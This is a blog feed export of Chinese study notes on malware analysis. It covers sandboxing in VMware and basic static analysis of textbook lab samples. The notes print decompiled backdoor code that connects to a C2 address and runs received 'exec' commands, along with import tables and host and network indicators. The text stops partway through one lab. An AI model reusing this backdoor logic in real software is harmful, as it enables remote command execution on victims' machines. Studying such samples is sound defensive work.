    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>很多恶意代码无疑会对运行环境造成不同程度的损害，在分析恶意代码功能的时候我们最好将恶意代码放在虚拟环境下进行分析，除了有一些无法通过虚拟化环境分析的恶意代码需要用安装了<code>Norton Ghost</code>等还原系统的物理机里进行分析。本章主要讲了如何在虚拟环境下分析恶意代码以及我们在虚拟环境下分析恶意代码可能造成的问题。</p><p><strong>虚拟化环境：</strong>对我们而言，最容易创造的虚拟化环境就是用<code>Vmware</code>、<code>Hyper-v</code>或者<code>Virtual Box</code>创建一个虚拟机，另外还有一些用<code>Docker</code>容器作为虚拟化环境的恶意代码分析手段，但是我感觉这种方式暂时还不成熟，有很多技术<code>Vmware</code>可以做的更好，而且安全性方面<code>Vmware</code>隔离更彻底，更安全。因此我们可以用功能十分强大的<code>Vmware</code>创建一个属于自己的恶意代码分析环境，创建虚拟机以及虚拟机的使用方法网上已经有很多教程了，此处不再赘述，而着重介绍与恶意代码分析相关的虚拟机用法。</p><span id="more"></span><p><strong>虚拟环境网络配置：</strong>在拿到一个恶意软件的第一时间，如果对该恶意代码功能并不清楚，首先要将虚拟机的网络连接断开，以防止运行在虚拟环境的的恶意代码对网络上的其他主机造成安全风险，比如当时<code>Wanna Cry</code>爆发时，很多安全分析员在分析恶意代码时就把同事的电脑给感染了，因此我们需要选择一个相对安全的网络模式，虚拟机网络选项通常又如下几种：</p><table><thead><tr><th>模式</th><th>区别</th></tr></thead><tbody><tr><td>Host-Only（仅主机模式）</td><td>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。</td></tr><tr><td>Bridged（桥接模式）</td><td>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机IP地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。</td></tr><tr><td>NAT（网络地址转换模式）</td><td>如果你的网络IP资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。</td></tr><tr><td>自定义虚拟网络</td><td>可以通过此模式来自定义网络连接方式，也可配置多台虚拟机组成结构相对复杂的虚拟机网络</td></tr></tbody></table><p>在分析恶意代码的时候，我们最好使用<code>Host-Only</code>模式或者直接断开网络，使用<code>Host-Only</code>模式需要注意保证宿主主机开启防火墙并保证宿主主机安装了最新的安全补丁，当然如果恶意代码拥有宿主主机的<code>0day</code>，那么还是直接断开虚拟机网络为好。</p><p><strong>拍摄快照：</strong>快照是<code>Vmware</code>一个很强大的功能之一，在我刚接触虚拟机的时候我并不知道虚拟机有这个功能，于是在折腾<code>Kali</code>把环境搞坏了的时候就选择重新安装，现在看来真的是浪费了很多时间。快照可以保存虚拟机系统当前的状态，并可以在任何时间将虚拟机状态还原为这一状态的功能，因此我们可以在配置好恶意代码分析环境之前拍摄一个快照，然后再分析恶意代码，当分析完成后为了将系统还原为一个干净的状态就恢复这一快照，当前未保存的状态就会消失，镜像也可以有多个分支，每个快照会根据系统前后改变的程度而占用不同大小的磁盘空间，但是这个占用空间一般很小，大概2个G左右。</p><p><strong>虚拟机与宿主主机的数据传递：</strong>在安装了<code>Vmware Tools</code>的虚拟机上，用户可以通过简单的复制粘贴和拖放操作来在虚拟机和物理机之前传输文件，但是有时这种操作可能会造成虚拟机逃逸，因此如果没有传输文件的需要的话建议先关闭文件传输功能，或者在分析过程完成后并对恶意代码进行清理之后再开启此功能来传输文件。</p><p><strong>外围设备的连接和断开：</strong><code>Vmware</code>提供了为虚拟机连接各种外围设备的接口，如USB、光驱、摄像头等，在分析恶意代码的过程中，如果没有这些外围设备的使用需求，我们应该在分析恶意代码之前将这些连接断开以防止恶意代码对这些设备造成破坏。</p><p><strong>使用Vmware的风险：</strong>没有绝对安全的系统，虚拟环境也是一样，<code>Vmware</code>也经常发布安全性更新，之前也有黑客或白帽发现<code>Vmware</code>的<code>0day</code>漏洞的事，比较常见的是虚拟机逃逸，利用<code>Vmware</code>模拟CPU指令的一些缺陷或者缓冲区溢出或者逻辑漏洞等漏洞攻击虚拟机软件，使恶意代码能从虚拟环境中逃逸，对真实的物理机环境造成损害。为了降低发生此事的情况，我们需要即使更新宿主主机的系统安全补丁并及时更新虚拟软件尤其是厂商发布有关安全性的更新时。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><p>本章无课后练习</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>虚拟化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态分析基础技术</title>
    <link href="/2019/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>我觉得安全圈的思路都是差不多的，跟渗透测试一样，对一个恶意软件的分析也需要前期的信息收集阶段来帮助我们对目标有一个大致的了解和认识，方便确定下一步工作的方向。</p><p><strong>Virus Total：</strong>首先，拿到一个恶意软件如果不涉密的话可以直接上传到<code>VT</code>上看一下，这样差不多能确定此恶意软件的最早爆发日期和各种关键的信息。</p><p><strong>哈希值：</strong><code>hash</code>值就相当于恶意软件的指纹，是一个很重要的信息。</p><p><strong>关键字符串：</strong>可以使用<code>IDA Pro</code>或者<code>Strings</code>软件来查看程序中关键的字符串。</p><span id="more"></span><p><strong>加壳与代码混淆：</strong>一般来说，对软件加壳可以压缩软件代码占用的磁盘空间，使软件体积更小，另一方面，有的壳可以加密程序自身信息，是得程序难以通过逆向手段来对程序进行分析，是对程序本身的一种保护，大部分形况下加壳技术用来保护程序版权，但是恶意软件使用加壳方式来隐藏恶意代码，使得代码逻辑难以分析，这时候就需要我们使用已有的脱壳软件或者自己写脱壳脚本对软件进行脱壳还原。</p><p>使用<code>PEview</code>查看<code>IMAGE_SECTION_HEADER</code>的<code>.text</code>节头部信息，如果虚拟大小比原始大小大得多，意味着这个程序在内存中占用的空间比在磁盘上多得多，那么这个程序很可能是加壳的程序，<code>.data</code>节是例外。</p><p><strong>PE文件格式：</strong>PE文件格式就不多说了，网上有很多资料，要熟悉PE格式，方便后面的学习。</p><p><strong>静态链接|动态链接|运行时链接|链接库与函数：</strong>程序的导入表和导出表和一些用到的库对我们而言十分重要，静态链接由于重复占用内存因而不常见，运行时链接在正常的程序中一般见不到，但是在恶意软件中可能会出现，至于当需要用到函数的时候才会使用链接，增强了隐蔽性。另外一些Windows API允许调用者导入没有在程序头文件中导入的函数，最常见的两个是<code>LoadLibrary</code>和<code>GetProcAddress</code>，有时还可能会出现<code>LdrGetProcAddress</code>和<code>LdrLoadDll</code>,当程序中出现这些函数库时，安全人员无法通过静态分析的手法来分析程序链接的函数。</p><p><strong>Dependency Walker：</strong> 一款可以查看可执行文件动态链接函数的程序，<a href="http://www.dependencywalker.com/">下载链接。</a></p><p><strong>Resource Hacker：</strong>使用此工具来产看程序的资源节。</p><p>导入函数和导出函数是为了提高代码复用性的一种手段，导出函数通常出现在<code>dll</code>文件中，而<code>exe</code>文件中一般没有导出函数，如果发现一个<code>exe</code>文件有很多导出函数的话我们就需要多多留意。</p><p><strong>编译时间：</strong>使用<code>Delphi</code>语言编写的程序有着统一的编译时间：1992年6月19日，所以说，如果有一个程序的编译时间为1992年6月19日，那么这个程序很可能是用<code>Delphi</code>编写的</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab1-1"><a href="#Lab1-1" class="headerlink" title="Lab1-1"></a>Lab1-1</h3><p><strong>这个实验使用Lab01-01.exe和Lab01-01.dll文件，使用本章描述的工具和技术来获取关于这些文件的信息。</strong></p><p><strong>1.将文件上传至VT进行分析并产看报告，文件匹配到了已有的反病毒文件特征了吗?</strong></p><p>按照题目要求上传至VT查看结果即可。</p><p><strong>2.这些文件是什么时候编译的？</strong></p><p>其实VT上已经显示了此程序的<code>MetaData</code>即元信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Meta">CodeSize4096<br>EntryPoint0x1820<br>FileTypeWin32 EXE<br>FileTypeExtensionexe<br>ImageFileCharacteristicsNo relocs, Executable, No line numbers, No symbols, 32-bit<br>ImageVersion0.0<br>InitializedDataSize8192<br>LinkerVersion6.0<br>MIMETypeapplication/octet-stream<br>MachineTypeIntel 386 or later, and compatibles<br>OSVersion4.0<br>PETypePE32<br>SubsystemWindows command line<br>SubsystemVersion4.0<br>TimeStamp2010:12:19 17:16:19+01:00<br>UninitializedDataSize0<br></code></pre></td></tr></table></figure><p>这里已经显示了程序的编译时间为2010:12:19，另外可以通过软件<code>PEexplore</code>来查看时间戳：</p><p><img src="https://i.loli.net/2019/01/17/5c4035990c466.png"></p><p><strong>3.这两个文件中是否存在迹象说明他们是否被加壳或者混淆了？如果是，这些迹象在哪里。</strong></p><p>VT上显示的结果为此程序加壳，壳是穿山甲(Armadillo)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Packers</span><br><span class="hljs-attribute">PEiD</span>Armadillo v1.<span class="hljs-number">71</span><br></code></pre></td></tr></table></figure><p>但实际山此程序并没有加壳，可能是由于VT是采用机器学习来判断程序是否加壳存在一定的误判率。</p><p><code>.text</code>节表信息：</p><table><thead><tr><th>Name</th><th>Virtual Address</th><th>Virtual Size</th><th>Raw Size</th><th>Entropy</th></tr></thead><tbody><tr><td>.text</td><td>4096</td><td>2416</td><td>4096</td><td>4.45</td></tr></tbody></table><p>用<code>PEiD</code>查看查壳发现程序无壳。</p><p><strong>4.是否有导入函数显示出这个恶意代码是做什么的？如果是，是哪些导入函数。</strong></p><p>我个人习惯直接用IDA Pro查看导入函数:</p><p>Lab01-01.exe:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dns">AddressOrdinalNameLibrary<br><span class="hljs-number">00402000</span>CloseHandleKERNEL32<br><span class="hljs-number">00402004</span>UnmapViewOfFileKERNEL32<br><span class="hljs-number">00402008</span>IsBadReadPtrKERNEL32<br><span class="hljs-number">0040200</span>CMapViewOfFileKERNEL32<br><span class="hljs-number">00402010</span>CreateFileMappingAKERNEL32<br><span class="hljs-number">00402014</span>CreateFileAKERNEL32<br><span class="hljs-number">00402018</span>FindCloseKERNEL32<br><span class="hljs-number">0040201</span>CFindNextFileAKERNEL32<br><span class="hljs-number">00402020</span>FindFirstFileAKERNEL32<br><span class="hljs-number">00402024</span>CopyFileAKERNEL32<br><span class="hljs-number">0040202</span>CmallocMSVCRT<br><span class="hljs-number">00402030</span>exitMSVCRT<br><span class="hljs-number">00402034</span>_exitMSVCRT<br><span class="hljs-number">00402038</span>_XcptFilterMSVCRT<br><span class="hljs-number">0040203</span>C__p___initenvMSVCRT<br><span class="hljs-number">00402040</span>__getmainargsMSVCRT<br><span class="hljs-number">00402044</span>_inittermMSVCRT<br><span class="hljs-number">00402048</span>__setusermatherrMSVCRT<br><span class="hljs-number">0040204</span>C_adjust_fdivMSVCRT<br><span class="hljs-number">00402050</span>__p__commodeMSVCRT<br><span class="hljs-number">00402054</span>__p__fmodeMSVCRT<br><span class="hljs-number">00402058</span>__set_app_typeMSVCRT<br><span class="hljs-number">0040205</span>C_except_handler3MSVCRT<br><span class="hljs-number">00402060</span>_controlfpMSVCRT<br><span class="hljs-number">00402064</span>_stricmpMSVCRT<br></code></pre></td></tr></table></figure><p>Lab01-01.dll:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">AddressOrdinalNameLibrary<br>10002000SleepKERNEL32<br>10002004CreateProcessAKERNEL32<br>10002008CreateMutexAKERNEL32<br>1000200COpenMutexAKERNEL32<br>10002010CloseHandleKERNEL32<br>10002018_adjust_fdivMSVCRT<br>1000201CmallocMSVCRT<br>10002020_inittermMSVCRT<br>10002024freeMSVCRT<br>10002028strncmpMSVCRT<br>1000203023socketWS2_32<br>10002034115WSAStartupWS2_32<br>1000203811inet_addrWS2_32<br>1000203C4connectWS2_32<br>1000204019sendWS2_32<br>1000204422shutdownWS2_32<br>1000204816recvWS2_32<br>1000204C3closesocketWS2_32<br>10002050116WSACleanupWS2_32<br>100020549htonsWS2_32<br></code></pre></td></tr></table></figure><p>可以看出此应用程序导入表中含有对文件操作的函数，<code>dll</code>文件中有网络连接相关的函数。</p><p><strong>5.是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？</strong></p><p>通过查看程序中的字符串，很容易可以发现如下字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:0040304C NewFileName     db &#x27;C:\windows\system32\kerne132.dll&#x27;,0<br>.data:0040304C                                         ; DATA XREF: _main+3AA↑o<br>.data:0040306D                 align 10h<br>.data:00403070 dword_403070    dd 6E72654Bh            ; DATA XREF: _main+2DF↑r<br>.data:00403074 dword_403074    dd 32336C65h            ; DATA XREF: _main+2E7↑r<br>.data:00403078 byte_403078     db 2Eh                  ; DATA XREF: _main+2F2↑r<br>.data:00403079                 align 4<br>.data:0040307C ; CHAR ExistingFileName[]<br>.data:0040307C ExistingFileName db &#x27;Lab01-01.dll&#x27;,0    ; DATA XREF: _main+A7↑o<br>.data:0040307C                                         ; _main+3AF↑o<br>.data:00403089                 align 4<br>.data:0040308C ; CHAR FileName[]<br>.data:0040308C FileName        db &#x27;C:\Windows\System32\Kernel32.dll&#x27;,0<br></code></pre></td></tr></table></figure><p>因此我们可以查看<code>C:\windows\system32\kerne132.dll</code>文件是否存在，这里的<code>kernel</code>的最后的<code>l</code>用数字<code>1</code>代替了。</p><p><strong>6.是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？</strong></p><p>通过<code>IDA</code>查看<code>dll</code>文件的伪C代码，可以才看到在<code>DllMain()</code>函数中存在如下部分代码用于网络连接：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">-1</span> )<br>        &#123;<br>          name.sa_family = <span class="hljs-number">2</span>;<br>          *(_DWORD *)&amp;name.sa_data[<span class="hljs-number">2</span>] = inet_addr(cp);<br>          *(_WORD *)name.sa_data = htons(<span class="hljs-number">0x50</span>u);<br>          <span class="hljs-keyword">if</span> ( connect(v3, &amp;name, <span class="hljs-number">16</span>) != <span class="hljs-number">-1</span> )<br>          &#123;<br>            <span class="hljs-keyword">while</span> ( send(v3, ::buf, <span class="hljs-built_in">strlen</span>(::buf), <span class="hljs-number">0</span>) != <span class="hljs-number">-1</span> &amp;&amp; shutdown(v3, <span class="hljs-number">1</span>) != <span class="hljs-number">-1</span> )<br>            &#123;<br>              <span class="hljs-keyword">if</span> ( recv(v3, &amp;buf, <span class="hljs-number">4096</span>, <span class="hljs-number">0</span>) &gt; <span class="hljs-number">0</span> )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(Str1, &amp;buf, <span class="hljs-number">5u</span>) )<br>                &#123;<br>                  Sleep(<span class="hljs-number">0x60000</span>u);<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(aExec, &amp;buf, <span class="hljs-number">4u</span>) )<br>                &#123;<br>                  <span class="hljs-built_in">memset</span>(&amp;StartupInfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(StartupInfo));<br>                  StartupInfo.cb = <span class="hljs-number">68</span>;<br>                  CreateProcessA(<span class="hljs-number">0</span>, &amp;CommandLine, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x8000000</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);<br>                &#125;<br></code></pre></td></tr></table></figure><p>通过双击<code>cp</code>可以看到如下结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:10026010 ; char aExec[]<br>.data:10026010 aExec           db &#x27;exec&#x27;,0             ; DATA XREF: DllMain(x,x,x)+15B↑o<br>.data:10026015                 align 4<br>.data:10026018 ; char Str1[]<br>.data:10026018 Str1            db &#x27;sleep&#x27;,0            ; DATA XREF: DllMain(x,x,x)+136↑o<br>.data:1002601E                 align 10h<br>.data:10026020 ; char buf[]<br>.data:10026020 buf             db &#x27;hello&#x27;,0            ; DATA XREF: DllMain(x,x,x):loc_100010E9↑o<br>.data:10026020                                         ; DllMain(x,x,x)+EB↑o<br>.data:10026026                 align 4<br>.data:10026028 ; char cp[]<br>.data:10026028 cp              db &#x27;127.26.152.13&#x27;,0    ; DATA XREF: DllMain(x,x,x)+93↑o<br>.data:10026036                 align 4<br>.data:10026038 ; CHAR Name[]<br>.data:10026038 Name            db &#x27;SADFHUHF&#x27;,0         ; DATA XREF: DllMain(x,x,x)+38↑o<br>.data:10026038  <br></code></pre></td></tr></table></figure><p>因此我们了解到程序会向地址<code>127.26.152.13</code>建立网络连接，这一点可以作为网络特征。</p><p><strong>7.你猜这些文件的目的是什么？</strong></p><p>该<code>dll</code>文件类似木马程序，可以执行命令或者进入休眠，<code>127.26.152.13</code>相当于<code>C2</code>服务器，<code>exe</code>文件是用来释放安装此<code>dll</code>文件的。</p><h3 id="Lab1-2"><a href="#Lab1-2" class="headerlink" title="Lab1-2"></a>Lab1-2</h3><p><strong>分析Lab01-02.exe文件。</strong></p><p><strong>1.将此文件上传到VT并查看是否有匹配到的反病毒特征。</strong></p><p>按照题目要求上传至<code>VT</code>查看结果即可。</p><p><strong>2.这个文件是否有加壳或混淆的情况？请指明。如果该文件被加壳，请进行脱壳。</strong></p><p>把这个程序丢进<code>IDA</code>看一下发现弹出了一个警告框，提示该程序可能加了壳：</p><p><img src="https://i.loli.net/2019/01/18/5c41e123a6e41.png"></p><p><img src="https://i.loli.net/2019/01/18/5c41e2d17223d.png"></p><p>用<code>PEiD</code>查壳得知这个壳是<code>UPX</code></p><p><img src="https://i.loli.net/2019/01/18/5c41e31d9b699.png"></p><p>下载<code>UPX</code>脱壳工具使用命令<code>upx -d Lab01-02.exe</code>对程序脱脱壳，脱壳后发现程序由原来的<code>3kb</code>变为了<code>16kb</code></p><p><strong>3.有没有任何导入函数能暗示出这个程序的功能，如果有，这些导入函数是什么，给了你什么信息？</strong></p><p>将脱壳后的程序放入IDA中查看导入函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm">AddressOrdinalNameLibrary<br>00402000CreateServiceAADVAPI32<br>00402004StartServiceCtrlDispatcherAADVAPI32<br>00402008OpenSCManagerAADVAPI32<br>00402010SystemTimeToFileTimeKERNEL32<br>00402014GetModuleFileNameAKERNEL32<br>00402018CreateWaitableTimerAKERNEL32<br>0040201CExitProcessKERNEL32<br>00402020OpenMutexAKERNEL32<br>00402024SetWaitableTimerKERNEL32<br>00402028WaitForSingleObjectKERNEL32<br>0040202CCreateMutexAKERNEL32<br>00402030CreateThreadKERNEL32<br>00402038_exitMSVCRT<br>0040203C_XcptFilterMSVCRT<br>00402040exitMSVCRT<br>00402044__p___initenvMSVCRT<br>00402048__getmainargsMSVCRT<br>0040204C_inittermMSVCRT<br>00402050__setusermatherrMSVCRT<br>00402054_adjust_fdivMSVCRT<br>00402058__p__commodeMSVCRT<br>0040205C__p__fmodeMSVCRT<br>00402060__set_app_typeMSVCRT<br>00402064_except_handler3MSVCRT<br>00402068_controlfpMSVCRT<br>00402070InternetOpenUrlAWININET<br>00402074InternetOpenAWININET<br></code></pre></td></tr></table></figure><p>其中有一些创建服务的函数<code>CreateService</code>和打开一个URL的网络操作函数<code>InternetOpenUrl</code>需要我们注意。</p><p><strong>4.有哪些基于主机或者网络的特征可以被用来确定被这个恶意代码所感染的机器？</strong></p><p>通过<code>IDA</code>分析发现程序指定的<code>URL</code>为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.malwareanalysisbook.com<br></code></pre></td></tr></table></figure><p>程序会在计算机上创建一个名为<code>MalService</code>的服务，且程序会创建一个互斥量<code>HGL345</code></p><p>可通过如上特征确定被此恶意代码感染的机器。</p><h3 id="Lab1-3"><a href="#Lab1-3" class="headerlink" title="Lab1-3"></a>Lab1-3</h3><p><strong>分析Lab01-03.exe文件。</strong></p><p><strong>1.将此文件上传到VT并查看是否有匹配到的反病毒特征。</strong></p><p>按照题目要求上传至<code>VT</code>查看结果即可。</p><p><strong>2.这个文件是否有加壳或混淆的情况？请指明。如果该文件被加壳，请进行脱壳。</strong></p><p>用IDA打开此文件时同样弹窗警告该文件可能已被加壳，用<code>PEiD</code>无法识别程序的壳。</p><p><strong>3.有没有任何导入函数能暗示出这个程序的功能，如果有，这些导入函数是什么，给了你什么信息？</strong></p><p>暂时上不了网，这个先放一放。</p><p><strong>4.有哪些基于主机或者网络的特征可以被用来确定被这个恶意代码所感染的机器？</strong></p><p>暂未脱壳</p><h3 id="Lab1-4"><a href="#Lab1-4" class="headerlink" title="Lab1-4"></a>Lab1-4</h3><p><strong>分析Lab01-04.exe文件。</strong></p><p><strong>1.将此文件上传到VT并查看是否有匹配到的反病毒特征。</strong></p><p>按照题目要求上传至<code>VT</code>查看结果即可。</p><p><strong>2.这个文件是否有加壳或混淆的情况？请指明。如果该文件被加壳，请进行脱壳。</strong></p><p>此程序没有加壳迹象。</p><p><strong>3.这个文件是什么时候被编译的？</strong></p><p><code>PE Explore</code>显示此程序的编译时间是2019年8月30日，显然这个时间戳是被人为修改过的。</p><p><strong>4.有没有任何导入函数能暗示出这个程序的功能，如果有，这些导入函数是什么，给了你什么信息？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs asm">AddressOrdinalNameLibrary<br>00402000OpenProcessTokenADVAPI32<br>00402004LookupPrivilegeValueAADVAPI32<br>00402008AdjustTokenPrivilegesADVAPI32<br>00402010GetProcAddressKERNEL32<br>00402014LoadLibraryAKERNEL32<br>00402018WinExecKERNEL32<br>0040201CWriteFileKERNEL32<br>00402020CreateFileAKERNEL32<br>00402024SizeofResourceKERNEL32<br>00402028CreateRemoteThreadKERNEL32<br>0040202CFindResourceAKERNEL32<br>00402030GetModuleHandleAKERNEL32<br>00402034GetWindowsDirectoryAKERNEL32<br>00402038MoveFileAKERNEL32<br>0040203CGetTempPathAKERNEL32<br>00402040GetCurrentProcessKERNEL32<br>00402044OpenProcessKERNEL32<br>00402048CloseHandleKERNEL32<br>0040204CLoadResourceKERNEL32<br>00402054_snprintfMSVCRT<br>00402058_exitMSVCRT<br>0040205C_XcptFilterMSVCRT<br>00402060exitMSVCRT<br>00402064__p___initenvMSVCRT<br>00402068__getmainargsMSVCRT<br>0040206C_inittermMSVCRT<br>00402070__setusermatherrMSVCRT<br>00402074_adjust_fdivMSVCRT<br>00402078__p__commodeMSVCRT<br>0040207C__p__fmodeMSVCRT<br>00402080__set_app_typeMSVCRT<br>00402084_except_handler3MSVCRT<br>00402088_controlfpMSVCRT<br>0040208C_stricmpMSVCRT<br></code></pre></td></tr></table></figure><p>根据以上的部分函数，猜测此程序可以创建文件，进行进程的操作还可以进行权限<code>Privilege</code>的修改</p><p><strong>5.有哪些基于主机或者网络的特征可以被用来确定被这个恶意代码所感染的机器？</strong></p><p>代码data节含有如下重要信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:0040302C aSedebugprivile db &#x27;SeDebugPrivilege&#x27;,0 ; DATA XREF: sub_401174+1B↑o<br>.data:0040303D                 align 10h<br>.data:00403040 ; CHAR LibFileName[]<br>.data:00403040 